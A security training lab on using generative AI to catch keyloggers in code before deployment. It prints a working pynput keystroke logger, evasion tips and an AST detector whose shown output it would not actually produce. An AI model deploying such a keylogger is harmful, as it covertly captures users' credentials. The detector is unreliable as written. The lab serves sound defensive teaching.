![alt text](<../Screenshots/chatgpt_logo.png>)

# Hands-on Lab: Preventing Malicious Code Execution with Generative AI

**Estimated time:** 20 minutes

---

## Project Scenario

You are a **security architect** at a mid-sized software company. Your developers frequently use generative AI to accelerate coding. Last week, a junior developer inadvertently deployed code containing a keylogger that was suggested by an AI model.

While the developer had no malicious intent, the code captured 4 hours of keystrokes — including credentials to a production database. No data was exfiltrated, but the incident triggered a full security review.

Management has now tasked you with creating a **pre-deployment code review process** that uses generative AI to detect malicious patterns BEFORE code runs.

> *"Generative AI can write code — good and bad. Your job is to know the difference before it hits production."*

---

## Introduction

In this lab, you will:

| Activity                                        | Outcome                              |
| ----------------------------------------------- | ------------------------------------ |
| Generate a keylogger (educational context only) | Understand how attackers misuse AI   |
| Generate a detector script                      | Learn to identify malicious patterns |
| Analyze the detection methodology               | Build a prevention workflow          |

> **⚠️ Ethical Warning:** This lab is for defensive education ONLY. Never deploy keyloggers without explicit written consent. This demonstrates the importance of code review — not offense.

---

## Learning Objectives

After completing this lab, you will be able to:

| # | Objective                                                          |
| - | ------------------------------------------------------------------ |
| 1 | Leverage Generative AI to review potentially harmful code          |
| 2 | Understand how Gen AI can aid cybersecurity workflows              |
| 3 | Recognize and prevent key types of malicious behavior (keylogging) |

---

## How Generative AI Can Be Misused

| Scenario                                | Risk                             | Prevention                           |
| --------------------------------------- | -------------------------------- | ------------------------------------ |
| **Developer uses AI for code**    | AI may suggest insecure patterns | Code review + AI detector            |
| **Attacker prompts for malware**  | AI may generate malicious code   | Content filtering + usage monitoring |
| **Third-party AI-generated code** | Unknown origin, unknown quality  | Static analysis + sandbox testing    |

> *"The same AI that helps you code faster can help attackers code faster. Defenders must adapt."*

---

## Exercise 1: Generate the Keylogger (Misuse Case)

### Step 1: Open Generative AI

Open ChatGPT, IBM watsonx, Claude, or any generative AI platform.

### Step 2: Generate Keylogger Code

Copy and paste this prompt:

```
Generate a Python code to store any keystroke pressed in a file.
```

### Step 3: Review the Generated Code

The AI will likely generate code similar to:

```python
from pynput import keyboard

def on_press(key):
    with open("keystrokes.txt", "a") as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

**What this code does:**

| Line                            | Function                            |
| ------------------------------- | ----------------------------------- |
| `from pynput import keyboard` | Imports keyboard monitoring library |
| `on_press(key)`               | Triggered on every keystroke        |
| `open("keystrokes.txt", "a")` | Appends to a log file               |
| `listener.join()`             | Runs indefinitely until ESC key     |

> **Educational Note:** This code requires the `pynput` library. It's a functional keylogger — exactly what an attacker would want.

---

## Exercise 2: Generate a Detector Script

Now you'll use generative AI to create a script that detects keylogger patterns in code files.

### Step 1: Prompt for Detector

Copy and paste this prompt:

```
Write a Python script that scans a given .py file for keylogging behavior using suspicious imports like `pynput` or use of `keyboard.Listener`.
```

### Step 2: Review the Detector Code

The AI will generate a detector similar to:

```python
import ast

def detect_keylogger(filename):
    with open(filename, "r") as file:
        tree = ast.parse(file.read())
  
    suspicious_keywords = ["pynput", "keyboard.Listener", "on_press", "keystrokes.txt"]
  
    for node in ast.walk(tree):
        if isinstance(node, ast.Import) or isinstance(node, ast.ImportFrom):
            for alias in node.names:
                if alias.name in suspicious_keywords:
                    print(f"Suspicious import: {alias.name}")
        elif isinstance(node, ast.Str) and any(word in node.s for word in suspicious_keywords):
            print(f"Suspicious string: {node.s}")

detect_keylogger("keystroke_logger.py")
```

**How the detector works:**

| Component                 | Function                                        |
| ------------------------- | ----------------------------------------------- |
| `ast.parse()`           | Parses Python code into an Abstract Syntax Tree |
| `ast.walk()`            | Traverses every node in the code structure      |
| `suspicious_keywords`   | List of indicators to flag                      |
| `ast.Import/ImportFrom` | Catches suspicious library imports              |
| `ast.Str`               | Catches suspicious strings (file names, etc.)   |

---

## Exercise 3: Run the Detection (Optional)

If you want to test this locally:

### Prerequisites

- Windows, macOS, or Linux
- Python 3.6+ installed
- `pip` package manager

### Step 1: Install Required Library

Open a terminal/command prompt:

```bash
pip install pynput
```

### Step 2: Save the Keylogger Code

Create a file named `keystroke_logger.py` and paste the keylogger code.

### Step 3: Save the Detector Code

Create a file named `detector.py` and paste the detector code.

### Step 4: Run the Detector

```bash
python detector.py
```

**Expected output:**

```
Suspicious import: pynput
Suspicious string: keystrokes.txt
```

> ⚠️ **Do NOT run `keystroke_logger.py`** — it will start capturing your keystrokes.

---

## Exercise 4: Extend the Detector (Optional)

### Step 1: Ask AI to Add More Patterns

Copy and paste this prompt:

```
Enhance the detector to also flag:
- Network connections (socket, requests)
- File exfiltration patterns (uploading, email sending)
- Persistence mechanisms (registry writes, startup folder)
- Obfuscated code (base64, eval, exec)
```

### Step 2: Review the Enhanced Detector

The AI should generate a more comprehensive scanner that catches multiple malicious patterns.

---

## Investigation Questions

Answer these based on your AI-generated outputs:

| # | Question                                                                 | Your Answer |
| - | ------------------------------------------------------------------------ | ----------- |
| 1 | What library does the keylogger use to capture keystrokes?               |             |
| 2 | What file name does the keylogger write keystrokes to?                   |             |
| 3 | What Python module does the detector use to parse code?                  |             |
| 4 | List three suspicious keywords the detector looks for.                   |             |
| 5 | Why does the detector use AST parsing instead of simple string search?   |             |
| 6 | What key stops the keylogger from running?                               |             |
| 7 | How could you modify the detector to scan all `.py` files in a folder? |             |

---

## The Prevention Workflow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    CODE SAFETY WORKFLOW                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   1. DEVELOPER WRITES CODE (or AI generates)                                │
│                    │                                                         │
│                    ▼                                                         │
│   2. AI-POWERED DETECTOR SCANS                                              │
│      ├── Checks for suspicious imports                                      │
│      ├── Checks for dangerous functions                                     │
│      └── Checks for exfiltration patterns                                   │
│                    │                                                         │
│                    ▼                                                         │
│   3. FLAGS FOUND?                                                           │
│      ├── YES → Block deployment, alert security team                        │
│      └── NO  → Proceed to code review                                       │
│                    │                                                         │
│                    ▼                                                         │
│   4. HUMAN CODE REVIEW                                                      │
│                    │                                                         │
│                    ▼                                                         │
│   5. APPROVED → Deploy                                                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

| Concept                          | Description                                               |
| -------------------------------- | --------------------------------------------------------- |
| **AI-Assisted Detection**  | Generative AI can write both malicious code AND detectors |
| **AST Parsing**            | More reliable than string matching for code analysis      |
| **Defensive Mindset**      | Always review AI-generated code before execution          |
| **Ethical Responsibility** | Use this knowledge to protect, not attack                 |

---

## Test Your Knowledge

**Q1:** Why is AST parsing better than searching for strings when detecting malicious code?

```
Your answer:
_________________________________________________________________
```

**Q2:** What is one limitation of using generative AI to detect malicious code?

```
Your answer:
_________________________________________________________________
```

**Q3:** How could an attacker bypass a simple keyword-based detector?

```
Your answer:
_________________________________________________________________
```

### Answer Key

| Q# | Answer                                                                                                                               |
| -- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 1  | AST parsing understands code structure and semantics; string search can be bypassed with obfuscation, comments, or variable renaming |
| 2  | AI may miss novel attack patterns, flag false positives, or be bypassed by sophisticated obfuscation                                 |
| 3  | Rename variables (`keyboard.Listener` → `kb_listener`), encode strings, split imports across multiple lines, or use `exec()`  |

---

## Lab Completion Checklist

| Task                                             | Completed |
| ------------------------------------------------ | --------- |
| **Exercise 1: Generate Keylogger**         | ☐        |
| Generated keylogger code using AI                | ☐        |
| Understood how each line functions               | ☐        |
| **Exercise 2: Generate Detector**          | ☐        |
| Generated detector script using AI               | ☐        |
| Understood AST parsing methodology               | ☐        |
| **Exercise 3: Run Detection (Optional)**   | ☐        |
| Installed pynput (optional)                      | ☐        |
| Ran detector successfully (optional)             | ☐        |
| **Exercise 4: Extend Detector (Optional)** | ☐        |
| Added more malicious patterns                    | ☐        |
| **Questions**                              | ☐        |
| Answered all 7 investigation questions           | ☐        |

---

## Screenshot Checklist

| Screenshot              | Description                             |
| ----------------------- | --------------------------------------- |
| `keylogger_code.png`  | AI-generated keylogger code             |
| `detector_code.png`   | AI-generated detector code              |
| `detector_output.png` | Output when scanning the keylogger file |
| `answers.png`         | Your completed answers                  |

---

## Summary

In this lab, you have:

| Activity                                          | Completed |
| ------------------------------------------------- | --------- |
| Generated a keylogger (educational context)       | ☐        |
| Generated a detector using AST parsing            | ☐        |
| Learned how AI can both create and detect threats | ☐        |
| Built a prevention workflow for code review       | ☐        |

These skills are essential for:

- Security engineers reviewing AI-generated code
- DevSecOps teams implementing pre-deployment scanning
- Organizations adopting generative AI safely
- Defenders understanding attacker capabilities

---

## Additional Resources

| Resource                          | URL                                                   |
| --------------------------------- | ----------------------------------------------------- |
| Python AST Module Documentation   | https://docs.python.org/3/library/ast.html            |
| OWASP Code Review Guide           | https://owasp.org/www-project-code-review-guide/      |
| NIST AI Risk Management Framework | https://www.nist.gov/itl/ai-risk-management-framework |

---

## Congratulations!

You have successfully completed the **Preventing Malicious Code Execution with Generative AI** lab.

> *"Generative AI is a powerful tool — for defenders AND attackers. Your job is to ensure it helps more than it harms. You just learned one way to do that."*
